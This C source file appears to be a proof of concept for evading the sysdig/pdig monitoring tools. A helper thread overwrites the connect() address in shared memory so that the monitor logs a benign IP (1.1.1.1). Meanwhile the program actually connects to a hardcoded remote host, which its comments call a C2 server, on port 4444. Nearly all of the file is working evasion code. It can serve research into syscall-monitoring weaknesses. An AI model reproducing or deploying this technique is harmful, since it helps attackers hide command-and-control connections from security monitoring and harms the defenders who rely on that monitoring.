#define _GNU_SOURCE
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h> 
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
/* mmap */
#include <sys/mman.h>
/* string */
#include <string.h>
/* compile without -m32 for 64 bit call numbers */
#include <asm/unistd.h>      
#include <netdb.h>
#include <netinet/in.h>

#define MAX 80 
#define PORT 4444
#define NANOSLEEP_TIME 900000000
#define FORCE_INLINE __attribute__((always_inline)) inline
#define handle_error_en(en, msg) \
  do { errno = (long)en; perror(msg); exit(EXIT_FAILURE); } while (0)

static int page_size;
static volatile char *page = NULL;

/* we try to overwrite our C2 Ip with a benign IP (1.1.1.1)
 * so that sysdig/pdig can't detect this malicious connect.
 * This is an arbitrary IP we want sysdig/pdig to report */
static volatile void 
write_ip_addr(struct sockaddr_in *serv_addr) 
{
  //const char benign_ip[] = "13.107.42.14";
  const char benign_ip[] = "1.1.1.1";
  struct hostent *server  = gethostbyname(benign_ip);
  bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
}

FORCE_INLINE int 
nanosleep_helper(long nsec) 
{
  struct timespec req, rem;
  req.tv_sec = 0;
  req.tv_nsec = nsec;

  ssize_t ret;
   
  asm volatile
  (
    "syscall"
    : "=a" (ret)
    /*                      RDI      RSI     */
    : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
    : "rcx", "r11", "memory"
  );
  return ret;
}

static void *
thread_start(void *arg) 
{
  nanosleep_helper(NANOSLEEP_TIME);
  write_ip_addr((struct sockaddr_in*)page);
  
  return NULL;
}

void chat(int sockfd) 
{ 
  char buff[MAX]; 
  int n; 
  for (;;) { 
    bzero(buff, sizeof(buff)); 
    printf("Enter the string : "); 
    n = 0; 
    while ((buff[n++] = getchar()) != '\n') 
        ; 
    write(sockfd, buff, sizeof(buff)); 
    bzero(buff, sizeof(buff)); 
    read(sockfd, buff, sizeof(buff)); 
    printf("From Server : %s", buff); 
    if ((strncmp(buff, "exit", 4)) == 0) { 
      printf("Client Exit...\n"); 
      break; 
    } 
  } 
} 
  
int main() 
{
  int s;
  pthread_t thread;

  /* set up the page */
  page_size = sysconf(_SC_PAGE_SIZE);
  page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED)
      handle_error_en(page, "mmap failure");

  /* start new thread */
  s = pthread_create(&thread, NULL, &thread_start, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_create");

    int sockfd, connfd; 
    struct sockaddr_in *servaddr, cli; 
  
    servaddr = (struct sockaddr_in *)page;
    // socket create and varification 
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
      printf("socket creation failed...\n"); 
      exit(0); 
    } 
    else
        printf("Socket successfully created..\n"); 
    bzero(servaddr, sizeof(*servaddr)); 
  
    // assign IP, PORT 
    servaddr->sin_family = AF_INET; 
    // local test
    //servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    // remote test
    servaddr->sin_addr.s_addr = inet_addr("18.118.35.14"); 
    servaddr->sin_port = htons(PORT); 
  
    // connect the client socket to server socket 
    if (connect(sockfd, servaddr, sizeof(*servaddr)) != 0) { 
      printf("connection with the server failed...\n"); 
      exit(0); 
    } 
    else
      printf("connected to the server..\n"); 
  
    // function for chat 
    chat(sockfd); 
  
    // close the socket 
    close(sockfd); 
} 
